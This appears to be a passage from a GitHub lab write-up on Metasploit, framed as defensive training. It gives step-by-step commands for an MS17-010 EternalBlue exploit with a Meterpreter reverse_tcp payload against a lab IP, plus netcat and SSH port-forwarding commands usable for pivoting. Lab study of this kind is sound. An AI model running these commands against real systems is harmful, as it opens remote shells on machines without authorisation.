Practicing in a lab helps defenders recognize scanning signatures and strengthen detection rules.
Tools & Skills Demonstrated
Metasploit Framework (msfconsole) — interactive exploitation and scanning environment.
Auxiliary Modules — non‑exploit functionality such as scanning and enumeration
TCP Port Scanner — discovering open ports and services
RHOSTS Configuration — defining target ranges for scanning
Run Command — executing modules in Metasploit
Defensive Awareness — recognizing port scan traffic and detection strategies


Exploit with Meterpreter Payload(MS17‑010 EternalBlue)
MS17‑010, also known as EternalBlue, is a critical Windows SMB vulnerability that was famously exploited by ransomware such as WannaCry. Metasploit includes an exploit module for this vulnerability, often paired with a Meterpreter payload to gain remote access.
In a defensive cybersecurity context, practicing this exploit in a controlled lab helps analysts understand how attackers weaponize vulnerabilities, how payloads behave once delivered, and how defenders can detect and mitigate such activity.
Practical Demonstration (Safe, Defensive Cybersecurity Context)
This demonstration shows how the EternalBlue exploit module is used in Metasploit with a Meterpreter payload inside a controlled lab environment.
Launch Metasploit Console
Code
msfconsole
Opens the Metasploit interactive environment.
Load the EternalBlue Exploit Module
Code
use exploit/windows/smb/ms17_010_eternalblue
Loads the exploit targeting the SMB vulnerability.
Set Target Host
Code
set RHOST 192.168.56.103
Defines the vulnerable target machine in the lab.
Configure Meterpreter Payload
Code
set PAYLOAD windows/meterpreter/reverse_tcp
Specifies the Meterpreter payload, which provides an interactive remote shell once delivered.
Run the Exploit
Code
run
Executes the exploit, attempting to gain a Meterpreter session.
Defensively, this highlights how exploit attempts generate unusual SMB traffic and how payloads establish reverse connections.


Key Takeaways
EternalBlue (MS17‑010) is a critical SMB vulnerability exploited in major ransomware attacks.
Metasploit’s exploit module demonstrates how attackers weaponize vulnerabilities.
Meterpreter payloads provide interactive remote shells, enabling post‑exploitation activities.
Defenders must monitor SMB traffic for exploit signatures and reverse connections.
Patch management is critical — MS17‑010 was mitigated by timely Windows updates.
Practicing in a lab builds awareness of exploit workflows and detection strategies.
Tools & Skills Demonstrated
Metasploit Framework (msfconsole) — exploit and payload management
EternalBlue Exploit Module — targeting SMB vulnerability MS17‑010
Meterpreter Payload — interactive remote shell for post‑exploitation
Exploit Execution Workflow — loading, configuring, and running modules
Defensive Awareness — recognizing exploit traffic and payload behavior
Patch Management Importance — preventing exploitation through timely updates

Practical demonstration; Start SSH server: systemctl start ssh on victims pc
nc -l -p 80 to start internal service ,  ssh -L 8080:internal-web.local:80 admin@192.168.1.100 to create local port forward ,ssh -R 2222:localhost:22 admin@192.168.1.100 to Create remote port forward ,Test service: curl http://localhost:8080 
<img width="385" height="286" alt="Screenshot 2026-07-11 053157" src="https://github.com/user-attachments/assets/6d7694e4-e93a-4d36-8036-bc9c47b3e904" />
<img width="441" height="275" alt="Screenshot 2026-07-11 051536" src="https://github.com/user-attachments/assets/252735e6-c0db-4d44-9541-377002a6c2dd" />
<img width="395" height="275" alt="Screenshot 2026-07-11 050820" src="https://github.com/user-attachments/assets/77aa5e8a-b76f-473c-be40-9eedd8b903b6" />
<img width="436" height="275" alt="Screenshot 2026-07-11 044949" src="https://github.com/user-attachments/assets/176ebe36-f643-46fb-a804-2d652a0564e8" />
<img width="478" height="277" alt="Screenshot 2026-07-10 195550" src="https://github.com/user-attachments/assets/01c32382-4155-4907-a8f8-d2f5a5746eae" />
<img width="472" height="276" alt="Screenshot 2026-07-10 184930" src="https://github.com/user-attachments/assets/65872aed-ab05-4562-a389-657a8471f284" />
<img width="424" height="202" alt="Screenshot 2026-07-10 163051" src="https://github.com/user-attachments/assets/22587f9b-7563-41a4-ae22-9a54bb6379e4" />
<img width="379" height="176" alt="Screenshot 2026-07-10 162028" src="https://github.com/user-attachments/assets/f497641c-1f6e-49ed-a67e-967144889716" />
<img width="457" height="245" alt="Screenshot 2026-07-10 120847" src="https://github.com/user-attachments/assets/fe4061a2-e8f4-4765-bc94-c3eb839b2b27" />
<img width="471" height="173" alt="Screenshot 2026-07-10 091237" src="https://github.com/user-attachments/assets/bdefaea2-2d81-440c-bc81-0db6fe54d5fe" />
<img width="487" height="224" alt="Screenshot 2026-07-10 084215" src="https://github.com/user-attachments/assets/1aeb9cec-0a60-449c-ad88-af65bcacadcc" />
<img width="407" height="227" alt="Screenshot 2026-07-10 084204" src="https://github.com/user-attachments/assets/c70d05a3-7ca3-4938-9a03-3be95e48c942" />
<img width="413" height="278" alt="Screenshot 2026-07-10 082651" src="https://github.com/user-attachments/assets/6bd9bd21-5bbb-4bd2-86bc-0d0896a0338b" />
<img width="444" height="293" alt="Screenshot 2026-07-10 072909" src="https://github.com/user-attachments/assets/7381b15a-1894-457e-b989-bb267c8058a4" />
<img width="473" height="278" alt="Screenshot 2026-07-10 062743" src="https://github.com/user-attachments/assets/13eadf09-b1b4-4341-b595-143dd10c2a57" />
<img width="455" height="275" alt="Screenshot 2026-07-10 061103" src="https://github.com/user-attachments/assets/452de491-2d79-414d-977c-a86865821a5b" />
<img width="229" height="180" alt="Screenshot 2026-07-10 061043" src="https://github.com/user-attachments/assets/929c9949-bb1a-4265-bd43-50c109b33d28" />
<img width="395" height="334" alt="Screenshot 2026-07-10 060157" src="https://github.com/user-attachments/assets/c3b811de-2bb0-4abd-9c2c-a5d1f37ec41f" />
<img width="335" height="278" alt="Screenshot 2026-07-10 055158" src="https://github.com/user-attachments/assets/424b43fe-f5a4-450b-8ece-4ab625e8e983" />
<img width="508" height="386" alt="Screenshot 2026-07-10 054828" src="https://github.com/user-attachments/assets/4c25b2a6-6d84-444f-84b6-2c638bfda9f6" />

